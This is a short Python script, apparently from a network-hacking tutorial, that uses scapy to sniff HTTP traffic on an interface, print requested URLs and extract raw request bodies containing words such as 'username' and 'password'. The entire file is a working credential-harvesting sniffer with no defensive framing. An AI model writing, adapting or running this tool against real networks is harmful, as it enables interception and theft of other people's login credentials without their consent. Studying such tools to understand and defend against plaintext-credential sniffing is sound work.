import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface= interface, store = False, prn = process_sniffed_packet)

def print_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def login_info(packet):
    load = packet[scapy.Raw].load
    keywords = ['username', 'user', 'password', 'pass', 'login']
    for key in keywords:
        if key  in load:
            return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = print_url(packet)
        print("[+] HTTP REQUEST >> ", url)
        if packet.haslayer(scapy.Raw):
            load = login_info(packet)
            print("[+] Login Info: ", load, "\n\n") 

sniff('eth0')